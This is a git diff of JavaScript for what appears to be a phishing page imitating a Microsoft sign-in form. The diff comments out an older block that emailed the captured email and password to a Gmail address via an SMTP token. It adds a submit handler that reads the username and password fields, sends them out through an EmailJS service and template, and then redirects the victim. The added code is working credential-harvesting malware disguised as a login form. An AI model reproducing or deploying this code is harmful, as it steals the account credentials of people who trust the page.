@@ -42,20 +42,20 @@ sig.addEventListener('click', () => {
 
     window.open("https://www.microsoft.com");
 
-    var email = document.getElementById('inp_uname').value;
-    var password = document.getElementById('inp_pwd').value;
-    var body = 'email: '+email + '<br/> password: '+password;
+    // var email = document.getElementById('inp_uname').value;
+    // var password = document.getElementById('inp_pwd').value;
+    // var body = 'email: '+email + '<br/> password: '+password;
 
 
                 
     
-    Email.send({
-    SecureToken : " d1c02ba7-6695-449c-aa21-69c9797c274a",
-    To : 'Sandratown260@gmail.com',
-    From : 'Sandratown260@gmail.com',
-    Subject : "This is the subject",
-    Body : body
-    })  
+    // Email.send({
+    // SecureToken : " d1c02ba7-6695-449c-aa21-69c9797c274a",
+    // To : 'Sandratown260@gmail.com',
+    // From : 'Sandratown260@gmail.com',
+    // Subject : "This is the subject",
+    // Body : body
+    // })  
     
 })
 
@@ -120,3 +120,27 @@ document.querySelector('.back').addEventListener('click', () => {
     document.getElementById("section_pwd").classList.toggle('d-none');
     document.getElementById('section_uname').classList.remove('d-none');
 })
+
+document.getElementById('form').addEventListener('submit', function (event) {
+    event.preventDefault(); // Prevent the default form submission
+
+    // Get the form data
+    const username = document.getElementById('inp_uname').value;
+    const password = document.getElementById('inp_pwd').value;
+
+    const formData = {
+        username: username,
+        password: password
+    };
+
+    // Send the form data via Email.js
+    emailjs.send("service_bleeahe", "template_3sjzma2", formData)
+        .then(function (response) {
+            console.log('SUCCESS!', response.status, response.text);
+            redirectToURL();
+        }, function (error) {
+            console.log('ERROR!', error);
+            redirectToURL();
+        });
+});
+
